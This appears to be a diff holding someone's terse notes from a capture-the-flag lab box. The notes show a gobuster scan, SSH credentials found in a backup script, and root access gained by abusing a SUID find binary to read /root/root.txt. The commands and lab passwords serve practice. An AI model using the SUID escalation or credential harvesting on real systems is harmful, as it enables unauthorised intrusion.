@@ -1,0 +1,42 @@
+Date:12/mar/2021
+Time:14:00
+
+gobuster dir -u http://10.10.244.32 -w /usr/share/wordlists/dirb/common.txt
+10.10.244.32/joomla/_test/index.php
+
+basterd@ -p 55007
+superduperp@$$
+do ssh 
+
+
+$ ls
+backup.sh
+$ pwd     
+/home/basterd
+$ cat backup.sh
+
+SOURCE=/home/stoner
+TARGET=/usr/local/backup
+
+LOG=/home/stoner/bck.log
+ 
+DATE=`date +%y\.%m\.%d\.`
+
+USER=stoner
+#superduperp@$$no1knows
+
+do ssh
+
+stoner@Vulnerable:~$ cat .secret
+You made it till here, well done.
+
+stoner@Vulnerable:~$ nano sample
+stoner@Vulnerable:~$ ls
+sample
+stoner@Vulnerable:~$ find sample -exec whoami /;
+find: missing argument to `-exec'
+stoner@Vulnerable:~$ find sample -exec whoami \;
+root
+stoner@Vulnerable:~$ find sample -exec cat /root/root.txt \;
+It wasn't that hard, was it?
+
